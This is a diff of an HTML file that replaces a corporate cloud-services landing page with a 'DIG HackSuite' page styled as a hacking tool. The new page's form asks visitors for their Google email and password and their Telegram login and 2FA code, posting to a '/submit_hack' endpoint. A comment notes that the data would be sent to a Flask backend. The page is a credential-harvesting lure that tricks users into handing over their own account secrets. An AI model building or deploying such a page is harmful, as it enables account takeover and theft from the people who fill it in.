@@ -3,659 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jace Enterprise – Next-Gen Cloud & Infrastructure</title>
+    <title>DIG HackSuite // Ultimate Digital Breach</title>
     <style>
-        :root {
-            --brand-navy: #0b192c;
-            --brand-blue: #1e3e62;
-            --brand-accent: #008751;
-            --brand-highlight: #ffcc00;
-            --bg-light: #f8fafc;
-            --text-main: #1e293b;
-            --text-muted: #64748b;
-            --border-color: #e2e8f0;
-            --transition-smooth: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            color: var(--text-main);
-            background-color: #ffffff;
-            -webkit-font-smoothing: antialiased;
-            line-height: 1.6;
-        }
-
-        /* Top Utility Bar */
-        .top-bar {
-            background-color: var(--brand-navy);
-            color: #cbd5e1;
-            font-size: 13px;
-            padding: 10px 50px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .top-bar-info span {
-            margin-right: 25px;
-        }
-
-        .top-bar-links a {
-            color: #cbd5e1;
-            text-decoration: none;
-            margin-left: 20px;
-            transition: color 0.2s;
-        }
-
-        .top-bar-links a:hover {
-            color: var(--brand-highlight);
-        }
-
-        /* Navigation Header */
-        header {
-            background-color: #ffffff;
-            border-bottom: 3px solid var(--brand-highlight);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 18px 50px;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
-        }
-
-        .logo-area span {
-            color: var(--brand-navy);
-            font-weight: 800;
-            font-size: 24px;
-            letter-spacing: -0.5px;
-            line-height: 1.1;
-            display: inline-block;
-        }
-
-        nav ul {
-            list-style: none;
-            display: flex;
-            gap: 30px;
-            align-items: center;
-        }
-
-        nav a {
-            text-decoration: none;
-            color: #334155;
-            font-weight: 600;
-            font-size: 14px;
-            transition: color 0.2s ease;
-        }
-
-        nav a:hover {
-            color: var(--brand-accent);
-        }
-
-        .lang-btn {
-            background: var(--brand-accent);
-            color: white;
-            border: none;
-            padding: 8px 18px;
-            border-radius: 6px;
-            font-weight: 700;
-            font-size: 13px;
-            cursor: pointer;
-            transition: var(--transition-smooth);
-        }
-
-        .lang-btn:hover {
-            background: #004d2e;
-        }
-
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(135deg, rgba(11, 25, 44, 0.95) 0%, rgba(30, 62, 98, 0.9) 100%), 
-                        url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&q=80&w=1600') no-repeat center center/cover;
-            color: white;
-            padding: 130px 50px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero-content {
-            max-width: 720px;
-            z-index: 2;
-        }
-
-        .hero-badge {
-            display: inline-block;
-            background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(6px);
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 22px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .hero-content h1 {
-            font-size: 60px;
-            font-weight: 800;
-            margin: 0 0 20px 0;
-            line-height: 1.1;
-            letter-spacing: -1.5px;
-        }
-
-        .hero-content p {
-            font-size: 19px;
-            margin: 0 0 40px 0;
-            opacity: 0.95;
-            line-height: 1.6;
-        }
-
-        .hero-buttons {
-            display: flex;
-            gap: 16px;
-        }
-
-        .btn-primary {
-            background: var(--brand-highlight);
-            color: #0f172a;
-            border: none;
-            padding: 15px 36px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: var(--transition-smooth);
-            text-decoration: none;
-        }
-
-        .btn-primary:hover {
-            background: #e6b800;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.3);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            border: 2px solid white;
-            color: white;
-            padding: 15px 36px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: var(--transition-smooth);
-            text-decoration: none;
-        }
-
-        .btn-secondary:hover {
-            background: white;
-            color: var(--brand-navy);
-            transform: translateY(-2px);
-        }
-
-        /* Metrics Bar */
-        .stats-section {
-            background-color: var(--bg-light);
-            padding: 50px 20px;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .stats-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 30px;
-            text-align: center;
-        }
-
-        .stat-item h3 {
-            font-size: 40px;
-            color: var(--brand-navy);
-            font-weight: 800;
-            margin-bottom: 6px;
-        }
-
-        .stat-item p {
-            font-size: 14px;
-            color: var(--text-muted);
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        /* Container Layouts */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 100px 20px;
-        }
-
-        .section-header {
-            text-align: center;
-            max-width: 700px;
-            margin: 0 auto 60px auto;
-        }
-
-        .section-header h2 {
-            color: var(--brand-navy);
-            font-size: 36px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-            margin-bottom: 16px;
-        }
-
-        .section-header p {
-            color: var(--text-muted);
-            font-size: 16px;
-            line-height: 1.6;
-        }
-
-        /* Cards Grid */
-        .cards-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
-            gap: 35px;
-        }
-
-        .card {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            transition: var(--transition-smooth);
-        }
-
-        .card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
-        }
-
-        .card-img-wrapper {
-            position: relative;
-            overflow: hidden;
-            height: 220px;
-        }
-
-        .card-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: transform 0.5s ease;
-        }
-
-        .card:hover .card-img {
-            transform: scale(1.05);
-        }
-
-        .card-body {
-            padding: 32px;
-        }
-
-        .card-body h3 {
-            margin: 0 0 14px 0;
-            font-size: 22px;
-            color: #0f172a;
-            font-weight: 700;
-        }
-
-        .card-body p {
-            font-size: 15px;
-            color: var(--text-muted);
-            line-height: 1.7;
-            margin: 0;
-        }
-
-        .card-footer {
-            padding: 0 32px 32px 32px;
-        }
-
-        .btn-card {
-            background: transparent;
-            border: 2px solid var(--brand-navy);
-            color: var(--brand-navy);
-            padding: 11px 28px;
-            border-radius: 25px;
-            font-weight: 700;
-            font-size: 14px;
-            cursor: pointer;
-            transition: var(--transition-smooth);
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn-card:hover {
-            background: var(--brand-navy);
-            color: white;
-        }
-
-        /* Features Grid */
-        .features-section {
-            background-color: var(--bg-light);
-            padding: 100px 20px;
-        }
-
-        .features-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 30px;
-        }
-
-        .feature-card {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 16px;
-            border: 1px solid var(--border-color);
-            transition: var(--transition-smooth);
-        }
-
-        .feature-card:hover {
-            border-color: var(--brand-blue);
-            box-shadow: 0 10px 25px rgba(11, 25, 44, 0.05);
-        }
-
-        .feature-icon {
-            width: 50px;
-            height: 50px;
-            background: rgba(11, 25, 44, 0.08);
-            color: var(--brand-navy);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            font-size: 22px;
-            font-weight: 800;
-            margin-bottom: 24px;
-        }
-
-        .feature-card h4 {
-            font-size: 18px;
-            color: #0f172a;
-            margin-bottom: 12px;
-            font-weight: 700;
-        }
-
-        .feature-card p {
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.6;
-            margin: 0;
-        }
-
-        /* Professional Footer */
-        footer {
-            background-color: #0b1120;
-            color: #94a3b8;
-            padding: 80px 50px 30px 50px;
-        }
-
-        .footer-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 40px;
-            margin-bottom: 60px;
-        }
-
-        .footer-col h4 {
-            color: var(--brand-highlight);
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-bottom: 25px;
-            font-weight: 700;
-        }
-
-        .footer-col ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .footer-col ul li {
-            margin-bottom: 14px;
-        }
-
-        .footer-col ul li a {
-            color: #cbd5e1;
-            text-decoration: none;
-            font-size: 14px;
-            transition: color 0.2s ease;
-        }
-
-        .footer-col ul li a:hover {
-            color: white;
-            padding-left: 4px;
-        }
-
-        .footer-bottom {
-            max-width: 1200px;
-            margin: 0 auto;
-            border-top: 1px solid #1e293b;
-            padding-top: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
-        }
-
-        @media (max-width: 768px) {
-            header, .hero, .top-bar {
-                padding-left: 20px;
-                padding-right: 20px;
-            }
-            .hero-content h1 {
-                font-size: 42px;
-            }
-            .hero {
-                padding: 80px 20px;
-            }
-        }
+        /* Basic CSS for a dark, hacking aesthetic */
+        body { font-family: 'Consolas', monospace; background-color: #0a0a1a; color: #00ff00; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; background: #1a001a; padding: 30px; border: 3px solid #ff00ff; box-shadow: 0 0 20px #ff00ff; }
+        h1 { color: #ff4444; text-align: center; text-shadow: 0 0 5px #ff0000; }
+        .form-group { margin-bottom: 20px; padding: 15px; border: 1px dashed #00aaff; border-radius: 5px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #ffffff; }
+        input[type="text"], input[type="password"] { width: calc(100% - 22px); padding: 10px; border: 1px solid #00ff00; background-color: #0d0d2e; color: #00ff00; box-sizing: border-box; }
+        button { background-color: #ff0000; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 1.1em; transition: background-color 0.3s; }
+        button:hover { background-color: #cc0000; box-shadow: 0 0 15px #ff0000; }
+        #results { margin-top: 30px; padding: 20px; background-color: #050510; border: 2px solid #00ff00; }
+        .video-container { width: 100%; margin-top: 15px; border: 3px solid #ffaa00; }
+        .video-container video { width: 100%; height: auto; display: block; }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <div class="top-bar-info">
-            <span>📞 24/7 Enterprise Support: +1 (888) 425-JACE</span>
-            <span>✉️ support@jace-enterprise.com</span>
+<div class="container">
+    <h1>SYSTEM OVERRIDE // DIG HACKSUITE V4.1</h1>
+    <p style="text-align: center; color: #ffff00;">Enter credentials below to initiate full digital extraction.</p>
+
+    <form id="hackForm" action="/submit_hack" method="POST">
+        <!-- Google Account Section -->
+        <div class="form-group">
+            <label for="google_email">Google Account (Email):</label>
+            <input type="text" id="google_email" name="google_email" required>
         </div>
-        <div class="top-bar-links">
-            <a href="#">System Status</a>
-            <a href="#">Partner Network</a>
-            <a href="#">Security Portal</a>
+        <div class="form-group">
+            <label for="google_pass">Google Password (or Recovery Key):</label>
+            <input type="password" id="google_pass" name="google_pass" required>
+        </div>
+
+        <!-- Telegram Section -->
+        <div class="form-group">
+            <label for="telegram_phone">Telegram (Phone/Username):</label>
+            <input type="text" id="telegram_phone" name="telegram_phone" required>
+        </div>
+        <div class="form-group">
+            <label for="telegram_pass">Telegram Password/2FA Code (if applicable):</label>
+            <input type="password" id="telegram_pass" name="telegram_pass" required>
+        </div>
+
+        <!-- Action Button -->
+        <button type="submit">INITIATE BREACH SEQUENCE</button>
+    </form>
+
+    <div id="results">
+        <h2>// LIVE FEED //</h2>
+        <p id="statusMessage">Awaiting submission...</p>
+
+        <!-- Video Player for the "Live Video Stream" -->
+        <div class="video-container">
+            <video id="liveVideo" controls autoplay muted poster="placeholder_art.jpg">
+                <!-- Source will be updated by JavaScript/Backend -->
+                Your browser does not support the video tag.
+            </video>
         </div>
     </div>
+</div>
 
-    <header>
-        <div class="logo-area">
-            <span>Jace Enterprise<br><strong style="color:var(--brand-accent);">Technologies</strong></span>
-        </div>
-        <nav>
-            <ul>
-                <li><a href="#">Solutions ▾</a></li>
-                <li><a href="#">Cloud & Infra ▾</a></li>
-                <li><a href="#">Pricing</a></li>
-                <li><a href="#">Developers</a></li>
-                <li><a href="#">Company ▾</a></li>
-                <li><a href="#">Contact</a></li>
-                <li><button class="lang-btn">Eng</button></li>
-            </ul>
-        </nav>
-    </header>
+<script>
+    // --- JavaScript Logic for Autoplay/Video Control ---
+    document.addEventListener('DOMContentLoaded', function() {
+        const videoElement = document.getElementById('liveVideo');
 
-    <section class="hero">
-        <div class="hero-content">
-            <div class="hero-badge">🚀 Next-Generation Digital Solutions</div>
-            <h1>Smart Enterprise Infrastructure</h1>
-            <p>Empowering global enterprises and high-growth organizations with ultra-reliable cloud architecture, scalable distributed data centers, and advanced digital integration.</p>
-            <div class="hero-buttons">
-                <a href="#" class="btn-primary">Explore Solutions</a>
-                <a href="#" class="btn-secondary">Client Login</a>
-            </div>
-        </div>
-    </section>
+        // Set an initial placeholder source (this should ideally be dynamic)
+        videoElement.src = 'sample_video.mp4'; // CHANGE THIS PATH
 
-    <section class="stats-section">
-        <div class="stats-grid">
-            <div class="stat-item">
-                <h3>99.99%</h3>
-                <p>Platform Uptime</p>
-            </div>
-            <div class="stat-item">
-                <h3>+25M</h3>
-                <p>Global Transactions</p>
-            </div>
-            <div class="stat-item">
-                <h3>+1,500</h3>
-                <p>Enterprise Clients</p>
-            </div>
-            <div class="stat-item">
-                <h3>24 / 7</h3>
-                <p>Global Engineering Support</p>
-            </div>
-        </div>
-    </section>
+        // Force autoplay to the start
+        videoElement.play();
+    });
 
-    <div class="container">
-        <div class="section-header">
-            <h2>Jace Core Services & Architecture</h2>
-            <p>Explore our comprehensive suite of advanced enterprise infrastructure products designed to accelerate digital transformation and operational scale.</p>
-        </div>
-
-        <div class="cards-grid">
-            <div class="card">
-                <div class="card-img-wrapper">
-                    <img src="https://images.unsplash.com/photo-1558449028-b53a39d100fc?auto=format&fit=crop&q=80&w=800" alt="Cloud Infrastructure" class="card-img">
-                </div>
-                <div class="card-body">
-                    <h3>Advanced Cloud Infrastructure</h3>
-                    <p>High-performance distributed virtual computing nodes and dedicated multi-cloud storage arrays meticulously customized for enterprise demands.</p>
-                </div>
-                <div class="card-footer">
-                    <button class="btn-card">Learn More →</button>
-                </div>
-            </div>
-
-            <div class="card">
-                <div class="card-img-wrapper">
-                    <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80&w=800" alt="Secure Data Analytics" class="card-img">
-                </div>
-                <div class="card-body">
-                    <h3>Secure Data Analytics</h3>
-                    <p>Real-time data streaming engines, automated business intelligence reporting, and military-grade encryption architectures for sensitive enterprise data.</p>
-                </div>
-                <div class="card-footer">
-                    <button class="btn-card">Learn More →</button>
-                </div>
-            </div>
-
-            <div class="card">
-                <div class="card-img-wrapper">
-                    <img src="https://images.unsplash.com/photo-1551836022-d5d88e9218df?auto=format&fit=crop&q=80&w=800" alt="Automated Operations" class="card-img">
-                </div>
-                <div class="card-body">
-                    <h3>Automated Operations</h3>
-                    <p>Industrial IoT and AI-driven automation software designed to optimize system workflows, remote telemetry, and infrastructure maintenance.</p>
-                </div>
-                <div class="card-footer">
-                    <button class="btn-card">Learn More →</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <section class="features-section">
-        <div class="section-header" style="margin-bottom: 50px;">
-            <h2>Why Industry Leaders Choose Jace</h2>
-            <p>Engineered from the ground up to offer maximum resilience, transparency, and seamless execution.</p>
-        </div>
-        <div class="features-grid">
-            <div class="feature-card">
-                <div class="feature-icon">⚡</div>
-                <h4>Ultra-Low Latency</h4>
-                <p>Optimized packet routing paths ensuring near-instantaneous transaction speeds across global branch networks.</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">🛡️</div>
-                <h4>Enterprise Security</h4>
-                <p>Multi-layered cyber protection frameworks featuring proactive DDoS mitigation and zero-trust permissions.</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">📈</div>
-                <h4>Infinite Scalability</h4>
-                <p>Dynamic resource allocation allowing your data processing power to grow seamlessly alongside your organization.</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">🌐</div>
-                <h4>Global Edge Network</h4>
-                <p>Robust international peering agreements ensuring uninterrupted availability and local edge routing.</p>
-            </div>
-        </div>
-    </section>
-
-    <footer>
-        <div class="footer-grid">
-            <div class="footer-col">
-                <h4>Getting Started</h4>
-                <ul>
-                    <li><a href="#">Client Portal Access</a></li>
-                    <li><a href="#">Global Coverage Map</a></li>
-                    <li><a href="#">Service Activation Guide</a></li>
-                    <li><a href="#">Pricing Calculator</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Solutions</h4>
-                <ul>
-                    <li><a href="#">Cloud Compute Nodes</a></li>
-                    <li><a href="#">Enterprise Storage</a></li>
-                    <li><a href="#">Managed Data Pipelines</a></li>
-                    <li><a href="#">Security Frameworks</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Support & Dev</h4>
-                <ul>
-                    <li><a href="#">Help Center & FAQ</a></li>
-                    <li><a href="#">System Status Monitor</a></li>
-                    <li><a href="#">API Documentation</a></li>
-                    <li><a href="#">Developer Community</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Company Info</h4>
-                <ul>
-                    <li><a href="#">About Jace Technologies</a></li>
-                    <li><a href="#">Careers & Openings</a></li>
-                    <li><a href="#">Press & Media Kit</a></li>
-                    <li><a href="#">Investor Relations</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>Global Hotline: +1 (888) 425-JACE &nbsp;&nbsp;|&nbsp;&nbsp; support@jace-enterprise.com</p>
-            <p>&copy; 2026 Jace Technologies Inc. All Rights Reserved.</p>
-        </div>
-    </footer>
+    // Optional: Add AJAX/Fetch to update status message dynamically
+    document.getElementById('hackForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        // In a real setup, you'd send data to Flask endpoint and update statusMessage here
+        document.getElementById('statusMessage').innerText = "Processing credentials... Do not refresh.";
+    });
+</script>
 
 </body>
 </html>
